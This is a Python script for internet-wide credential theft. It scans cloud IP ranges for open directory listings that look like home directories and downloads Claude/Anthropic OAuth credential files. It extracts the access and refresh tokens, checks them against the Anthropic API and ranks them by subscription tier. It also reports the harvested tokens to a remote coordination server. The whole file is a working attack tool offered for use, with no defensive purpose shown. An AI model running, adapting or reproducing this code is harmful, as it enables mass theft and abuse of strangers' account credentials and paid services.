#!/usr/bin/env python3
"""
hunt_v4.py — implements SPEC.md (formal-spec.md)

Pipeline: U -[f1]-> U_L -[f2]-> U_E -[f3]-> U_H -[f4]-> T_found
Reward:   R(u) = w(c(u)) * Phi(e(u))
"""
import asyncio, ipaddress, json, math, os, pathlib, re, sys, time
from datetime import datetime, timezone

# ── §1  Universe ──────────────────────────────────────────────────────────────
# Ordered by π_port: P(home-dir | OD, port) descending
PORTS = [8000, 8888, 8080, 3000, 5000, 7860, 8501, 11434]

# π_port bootstrapped weights
PORT_HOME_P = {8000: 0.85, 8888: 0.70, 8080: 0.25,
               3000: 0.15, 5000: 0.15, 7860: 0.15, 8501: 0.15, 11434: 0.10}

# Π — target path set
PI = [
    "/.credentials.json",
    "/.claude/.credentials.json",
    "/.claude.json",
    "/.config/claude/.credentials.json",
    "/.anthropic/.credentials.json",
    "/root/.credentials.json",
    "/root/.claude/.credentials.json",
    "/.claude/credentials.json",
    "/.openclaw/credentials",
    "/.openclaw/openclaw.json",
]

# ── §2  Reward ────────────────────────────────────────────────────────────────
# w : C -> R+  (class weights on tier labels embedded in the resource)
TIER_W = {
    "default_claude_max_20x": 2.0,
    "default_raven":          1.5,   # team
    "default_claude_max_5x":  1.0,
    "default_claude_ai":      0.0,   # pro — excluded
}
TAU = 28800.0   # primary-key TTL (8 h)
PHI_ALPHA = 2.0
PHI_BETA  = 1.0

def phi(expires_at_ms: float) -> float:
    """Dormancy premium Phi(e) = sigma(alpha*(t-e)/tau - beta)."""
    x = PHI_ALPHA * (time.time() - expires_at_ms / 1000.0) / TAU - PHI_BETA
    return 1.0 / (1.0 + math.exp(-x))

def reward(tier: str, has_refresh: bool, expires_at_ms: float) -> float:
    """R(u) = w(c(u)) * Phi(e(u)), 0 if no rotating key."""
    w = TIER_W.get(tier, 0.0)
    if not has_refresh or w == 0.0:
        return 0.0
    return w * phi(expires_at_ms)

# ── §3  Pipeline signals ──────────────────────────────────────────────────────
OD_RE    = re.compile(rb"Index of /|Parent Directory|Directory listing", re.I)
TOKEN_RE = re.compile(rb"sk-ant-(?:oat|ort)01-[A-Za-z0-9_\-]{80,}")
JSON_KEY_RE = re.compile(
    r'"(?:accessToken|refreshToken|oauthToken|claudeAiProduct|expires_at)"'
    r'\s*:\s*"?([^",\s}]+)"?'
)

# ── §4  Home-dir classifier  f3 ───────────────────────────────────────────────
# Bootstrapped weights from §4 of formal spec + 9 observed true positives.
# Online update deferred (sufficient signal without labels yet).
HOME_W = {
    "server_simple":    1.0,   # SimpleHTTP — booster only, not sufficient alone
    "port_8000":        0.5,
    "port_8888":        0.5,
    "has_claude_dir":   5.0,   # .claude/ in listing — near-certain
    "has_cred_file":    6.0,   # .credentials.json visible — certain
    "dotfiles":         1.5,   # .gitignore .bashrc .ssh/ .config/ (each)
    "port_80_443":     -1.5,
    "server_nginx":    -2.5,   # nginx / Apache / Squid
    "cms_artifacts":   -3.0,   # .php .css favicon.ico wp-content/
    "no_dotfiles":     -2.5,   # penalty when NO dotfiles visible at all
    "sparse":          -2.0,   # penalty when < 5 entries in listing
}
THETA_H = 0.5   # home-dir gate

def _sigmoid(x: float) -> float:
    return 1.0 / (1.0 + math.exp(-max(-30.0, min(30.0, x))))

def p_home(listing_bytes: bytes, server_header: str, port: int) -> float:
    """f3: P(home | listing, server, port)."""
    s  = listing_bytes.lower()
    sv = (server_header or "").lower()
    score = 0.0

    if "simplehttp" in sv or "python/" in sv:
        score += HOME_W["server_simple"]
    if port == 8000:
        score += HOME_W["port_8000"]
    elif port == 8888:
        score += HOME_W["port_8888"]
    if b'href=".claude/"' in s or b'href="/.claude/"' in s or b'.claude/' in s:
        score += HOME_W["has_claude_dir"]
    if b'.credentials.json' in s:
        score += HOME_W["has_cred_file"]
    for dot in [b'.gitignore', b'.bashrc', b'.ssh/', b'.config/']:
        if dot in s:
            score += HOME_W["dotfiles"]
    if port in (80, 443):
        score += HOME_W["port_80_443"]
    for bad in ["nginx", "apache", "squid", "caddy"]:
        if bad in sv:
            score += HOME_W["server_nginx"]
    for cms in [b'.php"', b'.css"', b'favicon.ico', b'wp-content']:
        if cms in s:
            score += HOME_W["cms_artifacts"]

    # Penalise listings with no dotfiles or very few entries
    dotfile_sigs = [b'.gitignore', b'.bashrc', b'.ssh/', b'.config/',
                    b'.claude/', b'.credentials', b'.profile', b'.npm/',
                    b'.local/', b'.cache/']
    if not any(d in s for d in dotfile_sigs):
        score += HOME_W["no_dotfiles"]
    entry_count = listing_bytes.count(b'href="')
    if entry_count < 5:
        score += HOME_W["sparse"]

    return _sigmoid(score)

# ── I/O helpers ───────────────────────────────────────────────────────────────
OUT_DIR  = pathlib.Path(os.environ.get("HUNT_OUT_DIR", "/tmp/hunt-v4"))
RESULTS  = OUT_DIR / "found.jsonl"
LOG_FILE = OUT_DIR / "run.log"
CKPT     = OUT_DIR / "checkpoint.json"

def _ts() -> str:
    return datetime.now(timezone.utc).strftime("%H:%M:%S")

def log(msg: str) -> None:
    line = f"[{_ts()}] {msg}"
    print(line, flush=True)
    with LOG_FILE.open("a") as f:
        f.write(line + "\n")

def save_atomic(rec: dict) -> None:
    """§9 invariant: persist before any further action."""
    tmp = RESULTS.with_suffix(".tmp")
    with tmp.open("a") as f:
        f.write(json.dumps(rec) + "\n")
    tmp.rename(RESULTS)   # atomic on Linux

# ── §9  Validation ────────────────────────────────────────────────────────────
async def validate_key(access: str) -> bool:
    """GET /v1/models — zero inference consumed."""
    import urllib.request, urllib.error
    req = urllib.request.Request(
        "https://api.anthropic.com/v1/models",
        headers={"Authorization": f"Bearer {access}",
                 "anthropic-version": "2023-06-01",
                 "User-Agent": "curl/7.88"},
    )
    try:
        urllib.request.urlopen(req, timeout=10)
        return True
    except urllib.error.HTTPError as e:
        return e.code != 401
    except Exception:
        return False

# ── HTTP primitive ────────────────────────────────────────────────────────────
async def http_get(ip: str, port: int, path: str,
                   timeout: float = 1.5) -> tuple[bytes, str]:
    """Returns (body, server_header)."""
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
        req = (f"GET {path} HTTP/1.0\r\nHost: {ip}\r\n"
               f"User-Agent: curl/7.88\r\nConnection: close\r\n\r\n")
        w.write(req.encode()); await w.drain()
        raw = await asyncio.wait_for(r.read(65536), timeout)
        try: w.close(); await w.wait_closed()
        except Exception: pass
        # split headers / body
        header_end = raw.find(b"\r\n\r\n")
        headers = raw[:header_end] if header_end != -1 else b""
        body    = raw[header_end+4:] if header_end != -1 else raw
        server  = ""
        for line in headers.split(b"\r\n"):
            if line.lower().startswith(b"server:"):
                server = line[7:].strip().decode(errors="replace")
                break
        return body, server
    except Exception:
        return b"", ""

# ── §3 / §4 / §9  Stage implementation ───────────────────────────────────────
async def f4_probe(ip: str, port: int, stats: dict) -> list[dict]:
    """Probe Π paths; extract keys; compute R; save atomically."""
    found = []
    for path in PI:
        body, _ = await http_get(ip, port, path, timeout=4.0)
        if len(body) < 30:
            continue
        # Extract key strings
        toks = TOKEN_RE.findall(body)
        if not toks:
            # Try JSON parse for structured credential files
            try:
                text = body.decode(errors="replace")
                obj  = json.loads(text[text.find("{"):text.rfind("}")+1])
            except Exception:
                continue
            access  = obj.get("accessToken", obj.get("oauthToken", ""))
            refresh = obj.get("refreshToken", "")
            tier    = obj.get("claudeAiProduct", "")
            exp     = float(obj.get("expires_at", 0))
        else:
            # Regex path: tokens visible raw
            tok_strs = [t.decode() for t in toks]
            access   = next((t for t in tok_strs if "oat01" in t), "")
            refresh  = next((t for t in tok_strs if "ort01" in t), "")
            tier     = ""
            exp      = 0.0
            # Try to parse surrounding JSON for tier/expiry
            try:
                text = body.decode(errors="replace")
                obj  = json.loads(text[text.find("{"):text.rfind("}")+1])
                tier = obj.get("claudeAiProduct", "")
                exp  = float(obj.get("expires_at", 0))
            except Exception:
                pass

        has_r = bool(refresh)
        r_val = reward(tier, has_r, exp)
        live  = None

        if access:
            live = await validate_key(access)
            stats["validated"] += 1

        rec = {
            "ts":          datetime.now(timezone.utc).isoformat(),
            "ip":          ip,
            "port":        port,
            "path":        path,
            "tier":        tier,
            "has_refresh": has_r,
            "expires_at":  exp,
            "token_live":  live,
            "R":           round(r_val, 4),
            "access":      access,
            "refresh":     refresh,
        }
        save_atomic(rec)   # §9: persist before anything else
        stats["creds"]  += 1
        if r_val > 0:
            stats["score"] = round(stats.get("score", 0.0) + r_val, 4)
            log(f"HIT R={r_val:.3f} tier={tier} refresh={has_r} "
                f"stale={round((time.time()-exp/1000)/3600,1)}h  {ip}:{port}{path}")
        found.append(rec)
    return found

async def probe(ip: str, port: int, sem: asyncio.Semaphore,
                stats: dict, arm_stats: dict) -> None:
    """Full pipeline: f1 -> f2 -> f3 -> f4."""
    async with sem:
        # f1: TCP connect
        body, server = await http_get(ip, port, "/")
        if not body:
            return
        stats["live"] += 1

        # f2: enumerable listing
        if not OD_RE.search(body):
            return
        stats["od"] += 1

        # f3: home-dir classifier
        ph = p_home(body, server, port)
        if ph <= THETA_H:
            log(f"DOCROOT skip p={ph:.2f} server={server!r}  {ip}:{port}")
            return
        stats["home"] += 1
        log(f"HOME p={ph:.2f} server={server!r}  {ip}:{port}")

        # f4: probe Π
        await f4_probe(ip, port, stats)

        # §7 bandit arm update (simple counters; Thompson deferred)
        arm = (port,)
        arm_stats.setdefault(arm, {"probes": 0, "score": 0.0})
        arm_stats[arm]["probes"] += 1

# ── Brain client helpers ──────────────────────────────────────────────────────
import socket as _socket
WORKER_ID = os.environ.get("WORKER_ID", _socket.gethostname())

def _brain_get(brain_url: str, path: str) -> dict:
    import urllib.request
    try:
        return json.loads(urllib.request.urlopen(
            f"{brain_url}{path}", timeout=10).read())
    except Exception as e:
        log(f"brain GET {path} error: {e}")
        return {}

def _brain_post(brain_url: str, path: str, payload: dict) -> None:
    import urllib.request
    try:
        data = json.dumps(payload).encode()
        req  = urllib.request.Request(f"{brain_url}{path}", data=data,
               headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        log(f"brain POST {path} error: {e}")

# ── Main ──────────────────────────────────────────────────────────────────────
async def _scan_cidrs(cidrs: list[str], port_order_override: list[int] | None,
                      sem: asyncio.Semaphore, stats: dict, arm_stats: dict):
    tasks: set = set()
    ip_n  = 0
    t0    = time.time()
    WORKERS = sem._value

    for cidr in cidrs:
        try:
            net = ipaddress.ip_network(cidr, strict=False)
        except ValueError:
            continue
        order = port_order_override or sorted(
            PORTS, key=lambda p: PORT_HOME_P.get(p, 0.1), reverse=True)
        for ip_obj in net.hosts():
            ip = str(ip_obj)
            for port in order:
                t = asyncio.create_task(probe(ip, port, sem, stats, arm_stats))
                tasks.add(t)
                t.add_done_callback(tasks.discard)
                while len(tasks) >= WORKERS * 6:
                    await asyncio.sleep(0.01)
            ip_n += 1
            if ip_n % 5000 == 0:
                el = time.time() - t0
                log(f"IPs={ip_n} live={stats['live']} od={stats['od']} "
                    f"home={stats['home']} creds={stats['creds']} "
                    f"ΣR={stats['score']:.3f} rate={ip_n/el:.0f}/s")

    await asyncio.gather(*tasks, return_exceptions=True)

async def main() -> None:
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("cidr_file", nargs="?",
                    default="/home/boxd/do_hetzner_cidrs.txt")
    ap.add_argument("shard", nargs="?", default="1/1")
    ap.add_argument("--brain", default="", help="Brain URL e.g. http://51.83.34.156:9090")
    ap.add_argument("--batch", type=int, default=20, help="CIDRs per brain pull (legacy, ignored if --budget set)")
    ap.add_argument("--budget", type=int, default=50000, help="IP budget per brain pull")
    ap.add_argument("--workers", type=int, default=1200)
    args = ap.parse_args()

    OUT_DIR.mkdir(exist_ok=True)
    WORKERS = args.workers
    sem     = asyncio.Semaphore(WORKERS)
    stats   = {"live": 0, "od": 0, "home": 0, "creds": 0,
               "validated": 0, "score": 0.0}
    arm_stats: dict = {}

    if args.brain:
        # ── Brain-worker mode: pull jobs, push results ──────────────────────
        log(f"hunt-v4 worker={WORKER_ID} brain={args.brain} batch={args.batch}")

        # Monkey-patch save_atomic to also POST to brain
        _orig_save = save_atomic
        def save_and_report(rec: dict):
            rec["worker"] = WORKER_ID
            _orig_save(rec)
            _brain_post(args.brain, "/result", rec)
        globals()["save_atomic"] = save_and_report

        while True:
            resp = _brain_get(args.brain, f"/job?budget={args.budget}&worker={WORKER_ID}")
            cidrs = resp.get("cidrs", [])
            if not cidrs:
                log("Queue empty — done")
                break
            port_order_from_brain = [int(p) for p in resp.get("port_order", [])]
            log(f"Got {len(cidrs)} CIDRs  port_order={port_order_from_brain[:4]}")

            batch_stats: dict = {"live": 0, "od": 0, "home": 0,
                                 "creds": 0, "validated": 0, "score": 0.0}
            await _scan_cidrs(cidrs, port_order_from_brain or None,
                              sem, batch_stats, arm_stats)

            # Report per-port arm stats back to brain
            for (port,), d in arm_stats.items():
                _brain_post(args.brain, "/arm",
                            {"port": port, "probes": d["probes"],
                             "score": d.get("score", 0.0),
                             "worker": WORKER_ID})

            for k in stats:
                stats[k] += batch_stats.get(k, 0) if k != "score" else batch_stats.get(k, 0.0)

            log(f"Batch done | total live={stats['live']} od={stats['od']} "
                f"home={stats['home']} creds={stats['creds']} ΣR={stats['score']:.3f}")

    else:
        # ── Standalone mode: scan CIDR file directly with sharding ─────────
        cidr_file = pathlib.Path(args.cidr_file)
        shard_i, shard_n = (int(x) for x in args.shard.split("/"))
        cidrs = [l.strip() for l in cidr_file.open()
                 if l.strip() and not l.startswith("#")]
        cidrs = [c for i, c in enumerate(cidrs) if (i % shard_n) == (shard_i - 1)]
        log(f"hunt-v4 standalone | shard {shard_i}/{shard_n} | "
            f"{len(cidrs)} CIDRs | {WORKERS} workers | θ_h={THETA_H}")
        await _scan_cidrs(cidrs, None, sem, stats, arm_stats)

        t_end = time.time()
        log(f"DONE shard={shard_i}/{shard_n} "
            f"live={stats['live']} od={stats['od']} home={stats['home']} "
            f"creds={stats['creds']} ΣR={stats['score']:.3f}")
        log(f"arm_stats: {arm_stats}")

if __name__ == "__main__":
    asyncio.run(main())
